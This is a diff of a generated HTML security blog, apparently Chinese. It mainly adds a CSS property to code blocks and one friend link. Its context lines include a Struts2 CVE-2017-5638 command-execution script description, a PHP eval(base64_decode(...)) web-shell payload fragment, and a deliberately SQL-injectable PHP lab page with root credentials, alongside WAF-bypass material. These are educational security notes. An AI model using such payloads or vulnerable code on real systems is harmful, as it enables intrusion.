+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;description &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;[[
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;References:
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
@@ -6119,7 +6119,7 @@ username=@eval(base64_decode($_POST[action]));&amp;amp;action=QGluaV9zZXQoImRpc3
 &lt;li&gt;Mysql：5.5.53&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;PHP SQL注入页面代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$link &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;mysql_connect&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;)&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Mysql Cannot Connect&amp;#39;&lt;/span&gt;);
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -6276,7 +6276,7 @@ username=@eval(base64_decode($_POST[action]));&amp;amp;action=QGluaV9zZXQoImRpc3
 &lt;h2 id="0x02-get与post的区别"&gt;0x02 GET与POST的区别&lt;/h2&gt;
 &lt;p&gt;Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。到这里，大家应该有个大概的了解了，GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。&lt;/p&gt;
 &lt;p&gt;在网上已经有很多朋友写过了其问题的答案，但是对于WAF，我们就要转变角度去看了，第一点就是要看数据包的区别。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;GET&lt;/span&gt; /sql/index2.php?id=2 &lt;span style="color:#66d9ef"&gt;HTTP&lt;/span&gt;&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1.1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;GET&lt;/span&gt; /sql/index2.php?id=2 &lt;span style="color:#66d9ef"&gt;HTTP&lt;/span&gt;&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1.1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;192.168.1.102&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;User-Agent&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Accept&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
@@ -6286,7 +6286,7 @@ username=@eval(base64_decode($_POST[action]));&amp;amp;action=QGluaV9zZXQoImRpc3
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Connection&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;keep-alive&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Cache-Control&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;max-age=0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;POST&lt;/span&gt; /sql/search.php &lt;span style="color:#66d9ef"&gt;HTTP&lt;/span&gt;&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-http" data-lang="http"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;POST&lt;/span&gt; /sql/search.php &lt;span style="color:#66d9ef"&gt;HTTP&lt;/span&gt;&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1.1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;192.168.1.102&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;User-Agent&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Accept&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
@@ -6842,6 +6842,7 @@ Enter system view, return user view with Ctrl+Z.
 &lt;li&gt;&lt;a href="http://wolvez.club/"&gt;Wolvez&amp;rsquo;s blog&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://sym01.com/"&gt;SYM01&amp;rsquo;s blog&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://evi1cg.me/"&gt;Evi1cg&amp;rsquo;s blog&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.endlessparadox.com/"&gt;EndlessParadox&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://gotojava.cn/"&gt;澄澈少年的网络小站&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;blockquote&gt;
